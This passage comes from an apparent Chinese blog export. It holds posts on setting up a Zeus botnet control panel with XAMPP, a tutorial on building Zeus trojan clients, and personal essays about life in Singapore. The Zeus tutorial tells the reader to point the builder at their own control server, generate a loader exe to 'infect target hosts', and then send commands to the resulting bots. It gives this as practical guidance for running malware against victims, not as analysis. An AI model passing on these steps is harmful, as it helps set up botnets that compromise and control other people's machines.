下配置 Zeus 环境要比 Linux 下容易些，一是有现成的集成环境直接安装，二是没有权限问题，Linux 下 Zeus 的配置方法请参看前文。</p>\n<p>首先，安装 xampp-1.7.4，这是一个 Apache、PHP、MySQL 的集成环境，十分傻瓜好用。如果系统版本是 Vista 以上，会出现一个提示，注意 UAC 的问题。<br>\n<img src=\"/content/images/2015/12/1-2.jpg\" alt=\"\"></p>\n<p>安装过后，将 Zeus 工具包中的 server[php] 中的内容复制到安装目录 htdocs 目录下，有文件冲突则全部覆盖。<br>\n之后启动 xampp，将 Apache 和 MySQL 选 start，用非 IE 内核浏览器（chrome、火狐）打开<code>http://localhost/install</code>，填写信息并 update ，如果用火狐，将 Filezilla 也 start。<br>\n<img src=\"/content/images/2015/12/2-1.jpg\" alt=\"\"></p>\n<p>最后，打开<code>http://localhost/cp.php</code>即可登录使用。<br>\n<img src=\"/content/images/2015/12/3.jpg\" alt=\"\"></p>\n</div>","amp":"19","plaintext":"Windows 下配置 Zeus 环境要比 Linux 下容易些，一是有现成的集成环境直接安装，二是没有权限问题，Linux 下 Zeus\n的配置方法请参看前文。\n\n首先，安装 xampp-1.7.4，这是一个 Apache、PHP、MySQL 的集成环境，十分傻瓜好用。如果系统版本是 Vista 以上，会出现一个提示，注意\nUAC 的问题。\n\n\n安装过后，将 Zeus 工具包中的 server[php] 中的内容复制到安装目录 htdocs 目录下，有文件冲突则全部覆盖。\n之后启动 xampp，将 Apache 和 MySQL 选 start，用非 IE 内核浏览器（chrome、火狐）打开\nhttp://localhost/install，填写信息并 update ，如果用火狐，将 Filezilla 也 start。\n\n\n最后，打开http://localhost/cp.php即可登录使用。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-12-05T13:20:43.000Z","created_by":"1","updated_at":"2015-12-05T13:25:14.000Z","updated_by":"1","published_at":"2015-12-05T13:24:50.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c48","uuid":"e80780e4-dbef-4d6b-bd1d-e38a784b6427","title":"Zeus 客户端木马的生成和使用","slug":"zeus-client","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"前面两篇文章简述了 Zeus1.2.4.2 版控制端的搭建和配置，本文说明客户端的使用方法。\\n\\n在 Zeus 目录中，打开 builder 文件夹，运行 builder\\n\\n![](/content/images/2015/12/4-1.jpg)\\n\\n选择 edit config，编辑 config 文件，主要更改 4 个 IP 地址，改成你控制端所在主机的地址，就是上文配置 LAMP 环境，有控制面板的那个主机的 IP 地址，这样僵尸机会按照这个地址向控制端，即黑客发送信息，这样你就能在控制面板(cp.php)中收到僵尸机的信息。\\n\\n![](/content/images/2015/12/5-1.jpg)\\n\\n修改完毕后，保存，分别点击 build config 和 build loader，会生成 config.bin 和一个 exe 程序，将 config.bin 复制到前文中的 /var/www 下，而 exe 文件就是一个木马，用来感染目标主机，运行后，它会将一段恶意代码注入到系统 svchost 进程中，注入完毕后，目标主机会变为僵尸机，控制端会定时收到此僵尸机报告，之后点击报告选 create new script 就可以向僵尸机发送控制指令了。Zeus 支持的所有指令罗列在 system/botnet_scripts.php 文件中。\\n\\nPS：Zeus2.0.8.9 版本生成的木马，会将恶意代码注入到 explorer.exe 进程中，其所支持的指令也可以在源代码中查看到。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>前面两篇文章简述了 Zeus1.2.4.2 版控制端的搭建和配置，本文说明客户端的使用方法。</p>\n<p>在 Zeus 目录中，打开 builder 文件夹，运行 builder</p>\n<p><img src=\"/content/images/2015/12/4-1.jpg\" alt=\"\"></p>\n<p>选择 edit config，编辑 config 文件，主要更改 4 个 IP 地址，改成你控制端所在主机的地址，就是上文配置 LAMP 环境，有控制面板的那个主机的 IP 地址，这样僵尸机会按照这个地址向控制端，即黑客发送信息，这样你就能在控制面板(cp.php)中收到僵尸机的信息。</p>\n<p><img src=\"/content/images/2015/12/5-1.jpg\" alt=\"\"></p>\n<p>修改完毕后，保存，分别点击 build config 和 build loader，会生成 config.bin 和一个 exe 程序，将 config.bin 复制到前文中的 /var/www 下，而 exe 文件就是一个木马，用来感染目标主机，运行后，它会将一段恶意代码注入到系统 svchost 进程中，注入完毕后，目标主机会变为僵尸机，控制端会定时收到此僵尸机报告，之后点击报告选 create new script 就可以向僵尸机发送控制指令了。Zeus 支持的所有指令罗列在 system/botnet_scripts.php 文件中。</p>\n<p>PS：Zeus2.0.8.9 版本生成的木马，会将恶意代码注入到 explorer.exe 进程中，其所支持的指令也可以在源代码中查看到。</p>\n</div>","amp":"20","plaintext":"前面两篇文章简述了 Zeus1.2.4.2 版控制端的搭建和配置，本文说明客户端的使用方法。\n\n在 Zeus 目录中，打开 builder 文件夹，运行 builder\n\n\n\n选择 edit config，编辑 config 文件，主要更改 4 个 IP 地址，改成你控制端所在主机的地址，就是上文配置 LAMP\n环境，有控制面板的那个主机的 IP 地址，这样僵尸机会按照这个地址向控制端，即黑客发送信息，这样你就能在控制面板(cp.php)中收到僵尸机的信息。\n\n\n\n修改完毕后，保存，分别点击 build config 和 build loader，会生成 config.bin 和一个 exe 程序，将 config.bin\n复制到前文中的 /var/www 下，而 exe 文件就是一个木马，用来感染目标主机，运行后，它会将一段恶意代码注入到系统 svchost\n进程中，注入完毕后，目标主机会变为僵尸机，控制端会定时收到此僵尸机报告，之后点击报告选 create new script\n就可以向僵尸机发送控制指令了。Zeus 支持的所有指令罗列在 system/botnet_scripts.php 文件中。\n\nPS：Zeus2.0.8.9 版本生成的木马，会将恶意代码注入到 explorer.exe 进程中，其所支持的指令也可以在源代码中查看到。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-12-05T13:27:51.000Z","created_by":"1","updated_at":"2015-12-05T13:37:20.000Z","updated_by":"1","published_at":"2015-12-05T13:32:54.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c49","uuid":"5901f8c6-daa1-4cf9-bb2f-6dfac0c41415","title":"在新加坡的所见所感（一）","slug":"singapore1","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"![height=\\\"300px\\\" width=\\\"400px\\\"](/content/images/2015/12/beijing.jpg)\\n\\n2012 年到 2013 年，在新加坡工作和生活了一年，看到了很多，体会了很多，思考了很多，正是这一年，让我下定决心离开大陆，所以回国之后，唯一的目标就是想办法再出来。\\n\\n先说点儿最多人感兴趣的，就是黄赌毒。新加坡只禁毒，黄赌都是合法的。\\n##芽笼（Geylang）\\n\\n网上关于芽笼的介绍有很多，这里是新加坡政府划定的合法红灯区，妓院有营业执照，合法经营，合法纳税。妹子们则有专门的签证，俗称“黄卡”。这种持证上岗的妹子只有泰国人和中国人，好像是因为这种签证只对泰国和中国开放。\\n\\n芽笼地区的规划是十分有意思的。中间以 Geylang Road 为分界，北边是单数巷，南边是双数巷。在北边的单数巷集中了新加坡的各种美食，而南边的双数巷（LOR 8 ~ LOR 20）就是政府划定的红灯区，妓院都集中在这里。所以有一种说法，这种规划是根据孟子的名言“食色性也”而来。\\n\\n![](/content/images/2015/12/geylang1.jpg)\\n\\n红灯区只是有一点脏乱，但是治安并不差，一切都和外面一样有秩序，而且芽笼这里还有一个特点，就是寺庙众多。这种格局很像泰国，春业和寺庙共存，或许是因为出卖身体的人需要在精神上有个归宿吧。街上的店铺都是上午休息，开张时间从十二点到两三点不等，所以趁着上午不开门，可以随手拍几张照片。\\n\\n寺庙与红房子共存\\n\\n![](/content/images/2015/12/lingshan.jpg)\\n\\n38 号的招牌是“花园”，40 号的招牌是“天上人间”\\n\\n![](/content/images/2015/12/huayuan.jpg)\\n\\n典型的门店\\n\\n![](/content/images/2015/12/dianxing.jpg)\\n\\n有的时候在这里逛，也会思考，如果从传统文化的角度看，新加坡应该是法家思想的贯彻者和执行者吧，拥抱管仲，拒绝孔子。面对问题，解决问题，超级的实用主义。也会想到胡适的名言：一个肮脏的国家，如果人人都开始讲规则而不是谈道德！最终会变成一个有人味儿的正常国家，道德自然会逐渐回归；一个干净的国家，如果人人都不讲规则却大谈道德，人人都争当高尚，天天没事儿就谈道德规范，人人都大公无私，最终这个国家会堕落成为一个伪君子遍布的肮脏国家。\\n\\n新加坡有大量的外来劳工，芽笼这个地方，应该说，为社会治安的稳定，做出了特别的贡献。就像有大量外来务工人员的深圳，服务业也是异常繁荣，都是一个道理。\\n\\n##赌场\\n\\n新加坡有两个赌场，在鱼尾狮的附近有一个，在圣淘沙有一个。进了赌场，能深深体会到新加坡有钱人的富有，或许有大陆客过来赌也说不定。\\n\\n一提到赌场，很多人就和什么赌王，出老千儿联系在一起，其实根本就不是。如果赌场有输无赢，那全世界的赌场都没客人了，事实上，赌场和彩票差不多。赌场不会赔钱是因为赌场赢的概率比客人赢的概率略高，当客人基数大了以后，由于统计性质，自然不会输。但如果你运气好，是能赢点钱出来的。\\n\\n在赌场里面，有低注区，在这里玩儿几个小时，花的钱并不比去 KTV 之类的地方多出多少，其实就是普通的娱乐方式而已。\\n\\n![](/content/images/2015/12/duchang.jpg)\\n![](/content/images/2015/12/du2.jpg)\\n\\n经典的老虎机，看到右面那个把手就感觉萌萌哒。\\n\\n![](/content/images/2015/12/laohuji.jpg)\\n\\n反正逛完之后，如果用国务院腔调来说的话，那就是这些腐朽的资本主义国家，竟玩这些堕落的东西。可关键是，我们自己似乎哪样也没少，都在地下繁荣地运行着。面对问题，解决问题，总比当鸵鸟要好得多。我始终觉得，管子比孔子有用的多。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p><img src=\"/content/images/2015/12/beijing.jpg\" alt=\"height=&quot;300px&quot; width=&quot;400px&quot;\"></p>\n<p>2012 年到 2013 年，在新加坡工作和生活了一年，看到了很多，体会了很多，思考了很多，正是这一年，让我下定决心离开大陆，所以回国之后，唯一的目标就是想办法再出来。</p>\n<p>先说点儿最多人感兴趣的，就是黄赌毒。新加坡只禁毒，黄赌都是合法的。</p>\n<h2 id=\"geylang\">芽笼（Geylang）</h2>\n<p>网上关于芽笼的介绍有很多，这里是新加坡政府划定的合法红灯区，妓院有营业执照，合法经营，合法纳税。妹子们则有专门的签证，俗称“黄卡”。这种持证上岗的妹子只有泰国人和中国人，好像是因为这种签证只对泰国和中国开放。</p>\n<p>芽笼地区的规划是十分有意思的。中间以 Geylang Road 为分界，北边是单数巷，南边是双数巷。在北边的单数巷集中了新加坡的各种美食，而南边的双数巷（LOR 8 ~ LOR 20）就是政府划定的红灯区，妓院都集中在这里。所以有一种说法，这种规划是根据孟子的名言“食色性也”而来。</p>\n<p><img src=\"/content/images/2015/12/geylang1.jpg\" alt=\"\"></p>\n<p>红灯区只是有一点脏乱，但是治安并不差，一切都和外面一样有秩序，而且芽笼这里还有一个特点，就是寺庙众多。这种格局很像泰国，春业和寺庙共存，或许是因为出卖身体的人需要在精神上有个归宿吧。街上的店铺都是上午休息，开张时间从十二点到两三点不等，所以趁着上午不开门，可以随手拍几张照片。</p>\n<p>寺庙与红房子共存</p>\n<p><img src=\"/content/images/2015/12/lingshan.jpg\" alt=\"\"></p>\n<p>38 号的招牌是“花园”，40 号的招牌是“天上人间”</p>\n<p><img src=\"/content/images/2015/12/huayuan.jpg\" alt=\"\"></p>\n<p>典型的门店</p>\n<p><img src=\"/content/images/2015/12/dianxing.jpg\" alt=\"\"></p>\n<p>有的时候在这里逛，也会思考，如果从传统文化的角度看，新加坡应该是法家思想的贯彻者和执行者吧，拥抱管仲，拒绝孔子。面对问题，解决问题，超级的实用主义。也会想到胡适的名言：一个肮脏的国家，如果人人都开始讲规则而不是谈道德！最终会变成一个有人味儿的正常国家，道德自然会逐渐回归；一个干净的国家，如果人人都不讲规则却大谈道德，人人都争当高尚，天天没事儿就谈道德规范，人人都大公无私，最终这个国家会堕落成为一个伪君子遍布的肮脏国家。</p>\n<p>新加坡有大量的外来劳工，芽笼这个地方，应该说，为社会治安的稳定，做出了特别的贡献。就像有大量外来务工人员的深圳，服务业也是异常繁荣，都是一个道理。</p>\n<h2 id=\"\">赌场</h2>\n<p>新加坡有两个赌场，在鱼尾狮的附近有一个，在圣淘沙有一个。进了赌场，能深深体会到新加坡有钱人的富有，或许有大陆客过来赌也说不定。</p>\n<p>一提到赌场，很多人就和什么赌王，出老千儿联系在一起，其实根本就不是。如果赌场有输无赢，那全世界的赌场都没客人了，事实上，赌场和彩票差不多。赌场不会赔钱是因为赌场赢的概率比客人赢的概率略高，当客人基数大了以后，由于统计性质，自然不会输。但如果你运气好，是能赢点钱出来的。</p>\n<p>在赌场里面，有低注区，在这里玩儿几个小时，花的钱并不比去 KTV 之类的地方多出多少，其实就是普通的娱乐方式而已。</p>\n<p><img src=\"/content/images/2015/12/duchang.jpg\" alt=\"\"><br>\n<img src=\"/content/images/2015/12/du2.jpg\" alt=\"\"></p>\n<p>经典的老虎机，看到右面那个把手就感觉萌萌哒。</p>\n<p><img src=\"/content/images/2015/12/laohuji.jpg\" alt=\"\"></p>\n<p>反正逛完之后，如果用国务院腔调来说的话，那就是这些腐朽的资本主义国家，竟玩这些堕落的东西。可关键是，我们自己似乎哪样也没少，都在地下繁荣地运行着。面对问题，解决问题，总比当鸵鸟要好得多。我始终觉得，管子比孔子有用的多。</p>\n</div>","amp":"21","plaintext":"2012 年到 2013\n年，在新加坡工作和生活了一年，看到了很多，体会了很多，思考了很多，正是这一年，让我下定决心离开大陆，所以回国之后，唯一的目标就是想办法再出来。\n\n先说点儿最多人感兴趣的，就是黄赌毒。新加坡只禁毒，黄赌都是合法的。\n\n芽笼（Geylang）\n网上关于芽笼的介绍有很多，这里是新加坡政府划定的合法红灯区，妓院有营业执照，合法经营，合法纳税。妹子们则有专门的签证，俗称“黄卡”。这种持证上岗的妹子只有泰国人和中国人，好像是因为这种签证只对泰国和中国开放。\n\n芽笼地区的规划是十分有意思的。中间以 Geylang Road 为分界，北边是单数巷，南边是双数巷。在北边的单数巷集中了新加坡的各种美食，而南边的双数巷（LOR\n8 ~ LOR 20）就是政府划定的红灯区，妓院都集中在这里。所以有一种说法，这种规划是根据孟子的名言“食色性也”而来。\n\n\n\n红灯区只是有一点脏乱，但是治安并不差，一切都和外面一样有秩序，而且芽笼这里还有一个特点，就是寺庙众多。这种格局很像泰国，春业和寺庙共存，或许是因为出卖身体的人需要在精神上有个归宿吧。街上的店铺都是上午休息，开张时间从十二点到两三点不等，所以趁着上午不开门，可以随手拍几张照片。\n\n寺庙与红房子共存\n\n\n\n38 号的招牌是“花园”，40 号的招牌是“天上人间”\n\n\n\n典型的门店\n\n\n\n有的时候在这里逛，也会思考，如果从传统文化的角度看，新加坡应该是法家思想的贯彻者和执行者吧，拥抱管仲，拒绝孔子。面对问题，解决问题，超级的实用主义。也会想到胡适的名言：一个肮脏的国家，如果人人都开始讲规则而不是谈道德！最终会变成一个有人味儿的正常国家，道德自然会逐渐回归；一个干净的国家，如果人人都不讲规则却大谈道德，人人都争当高尚，天天没事儿就谈道德规范，人人都大公无私，最终这个国家会堕落成为一个伪君子遍布的肮脏国家。\n\n新加坡有大量的外来劳工，芽笼这个地方，应该说，为社会治安的稳定，做出了特别的贡献。就像有大量外来务工人员的深圳，服务业也是异常繁荣，都是一个道理。\n\n赌场\n新加坡有两个赌场，在鱼尾狮的附近有一个，在圣淘沙有一个。进了赌场，能深深体会到新加坡有钱人的富有，或许有大陆客过来赌也说不定。\n\n一提到赌场，很多人就和什么赌王，出老千儿联系在一起，其实根本就不是。如果赌场有输无赢，那全世界的赌场都没客人了，事实上，赌场和彩票差不多。赌场不会赔钱是因为赌场赢的概率比客人赢的概率略高，当客人基数大了以后，由于统计性质，自然不会输。但如果你运气好，是能赢点钱出来的。\n\n在赌场里面，有低注区，在这里玩儿几个小时，花的钱并不比去 KTV 之类的地方多出多少，其实就是普通的娱乐方式而已。\n\n\n\n\n经典的老虎机，看到右面那个把手就感觉萌萌哒。\n\n\n\n反正逛完之后，如果用国务院腔调来说的话，那就是这些腐朽的资本主义国家，竟玩这些堕落的东西。可关键是，我们自己似乎哪样也没少，都在地下繁荣地运行着。面对问题，解决问题，总比当鸵鸟要好得多。我始终觉得，管子比孔子有用的多。","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-12-06T10:43:22.000Z","created_by":"1","updated_at":"2015-12-08T12:48:01.000Z","updated_by":"1","published_at":"2015-12-06T14:07:06.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c4a","uuid":"08a7def1-ca4b-4b0f-9fcb-9b0e1d150a0d","title":"在新加坡的所见所感（二）","slug":"singapore2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"![height=\\\"300px\\\" width=\\\"400px\\\"](/content/images/2015/12/beijing.jpg)\\n\\n##房子\\n\\n新加坡作为弹丸之地，房子自然是紧俏资源，房价也很昂贵，也和我朝一样，并不是永久产权，是有使用期限的。我所了解的也有限，但粗略的说，这里的房子，分成组屋和公寓两类，组屋类似于我们的经济适用房，符合条件的人可以申请去买；公寓是比较有钱的人买的，要比组屋贵不少。\\n\\n组屋虽说是类似于经济适用房，但实际上，我感觉比国内的万科精品房，还要好得多。组屋基本上是三室起步的，这边的房子，我还没见过国内常说的偏单，至于独单，好像人家根本就不盖。二室的组屋，基本上是低收入家庭申请的，太难见到了，反正租房市场上基本看不见。\\n\\n我所租住的，就是一个三室组屋的一间，房东买完房子后，自己住主卧（新加坡称主人房），把另外两间卧室出租，然后我和另一位租客，以及房东一起生活，而我们付的房租，已经足够他还房贷了。\\n\\n房子楼下的环境是这样的。\\n\\n![](/content/images/2015/12/fangzi1.jpg)\\n\\n房子后面是联通各小街区的轻轨，轻到只有一节车厢，没有噪音，再后面就是森林了。\\n\\n![](/content/images/2015/12/fangzi4.jpg)\\n\\n每天回家会经过楼下这条长廊，有时会有五颜六色的很漂亮的鸟站在栏杆上叫\\n\\n![](/content/images/2015/12/fangzi2.jpg)\\n\\n楼下的回廊。\\n\\n![](/content/images/2015/12/fangzi3.jpg)\\n\\n我每天回家，都在想，如果我回到国内生活，我要花多少钱才能买到同样环境的房子，亦或者说，即便我有钱，恐怕都买不到如此好的环境。\\n\\n新加坡的公寓就更不用说了，公寓一般楼下都配有游泳池的，有的还有健身房。想游泳或者健身的时候，下楼来就可以了。\\n\\n这样的房子，价格换成人民币，按绝对数字来比较，比北京深圳贵不到哪里去，大家都是几百万的级别，但质量和环境，就相差十万八千里了。\\n\\n在腾讯上班的时候，公司旁边是帝景园。有的时候走到茶水间，向外眺望，就能看到楼外的阳台上，挂着白布黑字。上面写着“墙歪楼裂，危在旦夕”之类的，我没有细看，因为角度原因很多地方看不清楚。总之，大意就是房子质量有问题，被坑了。记得实习的时候就挂着这样的白布，一年过后来正式入职了，白布依然在挂着。\\n\\n从实习到正式工作，两年了，看到这些白布标语，我想过两件事：\\n\\n一件是，你们挂给谁看呢？给官员看？很明显，官员是不看的，看了也是不管的；给路人看？路人帮不到你们；给买房者看？或许吧，可以避免更多人上当。其实我想，他们自己也不知道挂给谁看，或者说，是挂给自己看的。因为除了贴这样的横幅宣泄怒气和怨气，以获得些许的心理安慰，他们再也没有什么方法来维权了，这种挂横幅的方式，只能体现百姓没有话语权的无力感。\\n\\n另一件是：如果我买了这样的房子会怎样？在深圳，像样的房子怎么也得几百万级别，人生能赚到几个几百万？说是半生财富亦不为过。如果说耗费半生财富，就买到这样一间有问题的房子，我会怎样？我想象不出来，总之，我不敢想，因为我根本接受不了。98 年朱总站在九江大堤，大骂“豆腐渣工程，王八蛋工程”，大堤都可以这样，房子会幸免？总之，我不相信哪幢房子，哪座楼盘真的质量过硬，没有偷工减料。退一万步讲，即便质量真的没问题又如何，上哪里去找如我曾租住的那样曲径通幽的环境。\\n\\n同样的做房奴，我为什么不去国外做。同样的还半生房贷。在北上广可以得到一个鸽子窝，或许还是豆腐渣的鸽子窝；在新加坡可以得到一个泳池公寓；在日本可以得到一个一户建；在欧美可以得到一个别墅，门前自带大花园。同样的付出，不同的回报，事实上，连付出都不同样，因为按购买力算，以人家的收入买房子比国内容易太多。得到的也有区别，无论日本还是欧美，房子下面的那块地皮，永远是你的。如此衡量，我没有任何留下的理由。\\n\\n新加坡的组屋，很便宜，但有一个小坑，就是 PR 才可以买二手组屋，外国人只能买公寓。一手的组屋新房，应该是只有本国人才可以买。也就是说，新加坡人凭借自己的国籍优势，买个组屋转手再卖，直接就能获利数十万甚至上百万。可以看到，政府对本国居民利益的保护，甚至是赤裸裸地偏向。\\n\\n这边的公寓还有另外一个特点，就是基本都带有佣人房，佣人房一般都在厨房的后边，是专门给佣人居住的。对新加坡的中产家庭来说，雇佣一个女佣，并不是什么难事。每个月几百块钱而已。主要是菲律宾、印尼等等地方的佣人，菲佣貌似价格贵一些。不得不感叹，真“腐朽”。\\n\\n##交通\\n新加坡开车的成本很高，因为拥车证很昂贵，并且拥车证还有期限。但是公共交通很发达，舒适。新加坡的马路上是没有交警的，我十分怀疑，他们是否有交警这个职业。这样一个弹丸之地，几乎看不到堵车，因为几乎没有抢道的情况。他们对于马路拥堵的感觉似乎就是，时速 20 公里/时，就是有点堵了。\\n\\n刚到这里的时候，十分不习惯，因为过马路的时候，尤其是过斑马线的时候，习惯性地让汽车先过，看到汽车远远开过来，都会下意识地停在路边等它过去。然而，这里的剧情是，汽车会直接停下来，等你过去。花了好长时间，才习惯看到汽车开过来之后，不管它，大胆地往前走。\\n\\n这里坐地铁也好，坐公交也罢，最大的感觉就是很舒服，很方便，在这里生活，我并没有买一辆车的欲望。记得多年以前，有专家谈到北京拥堵，提到的是，先要把公共交通建设好，让人们使用公共交通的时候，感觉到有尊严。我在这里乘地铁或者公交，并不觉得无趣，看看窗外的风景，时间很快就过去了，并且噪音很小，空气清新，速度也快，总而言之吧，我无法说清专家嘴里的尊严到底是什么，但我觉得，这里的公共交通，就是专家说的，该有的感觉。\\n\\n我们的确也有公共交通，大城市的公共交通也不能说不发达，但是仅仅是有而已，要是说到便捷、舒适、有尊严。乘坐公共交通也有不输于使用私家车的生活品质，还有太长的路要走。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p><img src=\"/content/images/2015/12/beijing.jpg\" alt=\"height=&quot;300px&quot; width=&quot;400px&quot;\"></p>\n<h2 id=\"\">房子</h2>\n<p>新加坡作为弹丸之地，房子自然是紧俏资源，房价也很昂贵，也和我朝一样，并不是永久产权，是有使用期限的。我所了解的也有限，但粗略的说，这里的房子，分成组屋和公寓两类，组屋类似于我们的经济适用房，符合条件的人可以申请去买；公寓是比较有钱的人买的，要比组屋贵不少。</p>\n<p>组屋虽说是类似于经济适用房，但实际上，我感觉比国内的万科精品房，还要好得多。组屋基本上是三室起步的，这边的房子，我还没见过国内常说的偏单，至于独单，好像人家根本就不盖。二室的组屋，基本上是低收入家庭申请的，太难见到了，反正租房市场上基本看不见。</p>\n<p>我所租住的，就是一个三室组屋的一间，房东买完房子后，自己住主卧（新加坡称主人房），把另外两间卧室出租，然后我和另一位租客，以及房东一起生活，而我们付的房租，已经足够他还房贷了。</p>\n<p>房子楼下的环境是这样的。</p>\n<p><img src=\"/content/images/2015/12/fangzi1.jpg\" alt=\"\"></p>\n<p>房子后面是联通各小街区的轻轨，轻到只有一节车厢，没有噪音，再后面就是森林了。</p>\n<p><img src=\"/content/images/2015/12/fangzi4.jpg\" alt=\"\"></p>\n<p>每天回家会经过楼下这条长廊，有时会有五颜六色的很漂亮的鸟站在栏杆上叫</p>\n<p><img src=\"/content/images/2015/12/fangzi2.jpg\" alt=\"\"></p>\n<p>楼下的回廊。</p>\n<p><img src=\"/content/images/2015/12/fangzi3.jpg\" alt=\"\"></p>\n<p>我每天回家，都在想，如果我回到国内生活，我要花多少钱才能买到同样环境的房子，亦或者说，即便我有钱，恐怕都买不到如此好的环境。</p>\n<p>新加坡的公寓就更不用说了，公寓一般楼下都配有游泳池的，有的还有健身房。想游泳或者健身的时候，下楼来就可以了。</p>\n<p>这样的房子，价格换成人民币，按绝对数字来比较，比北京深圳贵不到哪里去，大家都是几百万的级别，但质量和环境，就相差十万八千里了。</p>\n<p>在腾讯上班的时候，公司旁边是帝景园。有的时候走到茶水间，向外眺望，就能看到楼外的阳台上，挂着白布黑字。上面写着“墙歪楼裂，危在旦夕”之类的，我没有细看，因为角度原因很多地方看不清楚。总之，大意就是房子质量有问题，被坑了。记得实习的时候就挂着这样的白布，一年过后来正式入职了，白布依然在挂着。</p>\n<p>从实习到正式工作，两年了，看到这些白布标语，我想过两件事：</p>\n<p>一件是，你们挂给谁看呢？给官员看？很明显，官员是不看的，看了也是不管的；给路人看？路人帮不到你们；给买房者看？或许吧，可以避免更多人上当。其实我想，他们自己也不知道挂给谁看，或者说，是挂给自己看的。因为除了贴这样的横幅宣泄怒气和怨气，以获得些许的心理安慰，他们再也没有什么方法来维权了，这种挂横幅的方式，只能体现百姓没有话语权的无力感。</p>\n<p>另一件是：如果我买了这样的房子会怎样？在深圳，像样的房子怎么也得几百万级别，人生能赚到几个几百万？说是半生财富亦不为过。如果说耗费半生财富，就买到这样一间有问题的房子，我会怎样？我想象不出来，总之，我不敢想，因为我根本接受不了。98 年朱总站在九江大堤，大骂“豆腐渣工程，王八蛋工程”，大堤都可以这样，房子会幸免？总之，我不相信哪幢房子，哪座楼盘真的质量过硬，没有偷工减料。退一万步讲，即便质量真的没问题又如何，上哪里去找如我曾租住的那样曲径通幽的环境。</p>\n<p>同样的做房奴，我为什么不去国外做。同样的还半生房贷。在北上广可以得到一个鸽子窝，或许还是豆腐渣的鸽子窝；在新加坡可以得到一个泳池公寓；在日本可以得到一个一户建；在欧美可以得到一个别墅，门前自带大花园。同样的付出，不同的回报，事实上，连付出都不同样，因为按购买力算，以人家的收入买房子比国内容易太多。得到的也有区别，无论日本还是欧美，房子下面的那块地皮，永远是你的。如此衡量，我没有任何留下的理由。</p>\n<p>新加坡的组屋，很便宜，但有一个小坑，就是 PR 才可以买二手组屋，外国人只能买公寓。一手的组屋新房，应该是只有本国人才可以买。也就是说，新加坡人凭借自己的国籍优势，买个组屋转手再卖，直接就能获利数十万甚至上百万。可以看到，政府对本国居民利益的保护，甚至是赤裸裸地偏向。</p>\n<p>这边的公寓还有另外一个特点，就是基本都带有佣人房，佣人房一般都在厨房的后边，是专门给佣人居住的。对新加坡的中产家庭来说，雇佣一个女佣，并不是什么难事。每个月几百块钱而已。主要是菲律宾、印尼等等地方的佣人，菲佣貌似价格贵一些。不得不感叹，真“腐朽”。</p>\n<h2 id=\"\">交通</h2>\n<p>新加坡开车的成本很高，因为拥车证很昂贵，并且拥车证还有期限。但是公共交通很发达，舒适。新加坡的马路上是没有交警的，我十分怀疑，他们是否有交警这个职业。这样一个弹丸之地，几乎看不到堵车，因为几乎没有抢道的情况。他们对于马路拥堵的感觉似乎就是，时速 20 公里/时，就是有点堵了。</p>\n<p>刚到这里的时候，十分不习惯，因为过马路的时候，尤其是过斑马线的时候，习惯性地让汽车先过，看到汽车远远开过来，都会下意识地停在路边等它过去。然而，这里的剧情是，汽车会直接停下来，等你过去。花了好长时间，才习惯看到汽车开过来之后，不管它，大胆地往前走。</p>\n<p>这里坐地铁也好，坐公交也罢，最大的感觉就是很舒服，很方便，在这里生活，我并没有买一辆车的欲望。记得多年以前，有专家谈到北京拥堵，提到的是，先要把公共交通建设好，让人们使用公共交通的时候，感觉到有尊严。我在这里乘地铁或者公交，并不觉得无趣，看看窗外的风景，时间很快就过去了，并且噪音很小，空气清新，速度也快，总而言之吧，我无法说清专家嘴里的尊严到底是什么，但我觉得，这里的公共交通，就是专家说的，该有的感觉。</p>\n<p>我们的确也有公共交通，大城市的公共交通也不能说不发达，但是仅仅是有而已，要是说到便捷、舒适、有尊严。乘坐公共交通也有不输于使用私家车的生活品质，还有太长的路要走。</p>\n</div>","amp":"22","plaintext":"房子\n新加坡作为弹丸之地，房子自然是紧俏资源，房价也很昂贵，也和我朝一样，并不是永久产权，是有使用期限的。我所了解的也有限，但粗略的说，这里的房子，分成组屋和公寓两类，组屋类似于我们的经济适用房，符合条件的人可以申请去买；公寓是比较有钱的人买的，要比组屋贵不少。\n\n组屋虽说是类似于经济适用房，但实际上，我感觉比国内的万科精品房，还要好得多。组屋基本上是三室起步的，这边的房子，我还没见过国内常说的偏单，至于独单，好像人家根本就不盖。二室的组屋，基本上是低收入家庭申请的，太难见到了，反正租房市场上基本看不见。\n\n我所租住的，就是一个三室组屋的一间，房东买完房子后，自己住主卧（新加坡称主人房），把另外两间卧室出租，然后我和另一位租客，以及房东一起生活，而我们付的房租，已经足够他还房贷了。\n\n房子楼下的环境是这样的。\n\n\n\n房子后面是联通各小街区的轻轨，轻到只有一节车厢，没有噪音，再后面就是森林了。\n\n\n\n每天回家会经过楼下这条长廊，有时会有五颜六色的很漂亮的鸟站在栏杆上叫\n\n\n\n楼下的回廊。\n\n\n\n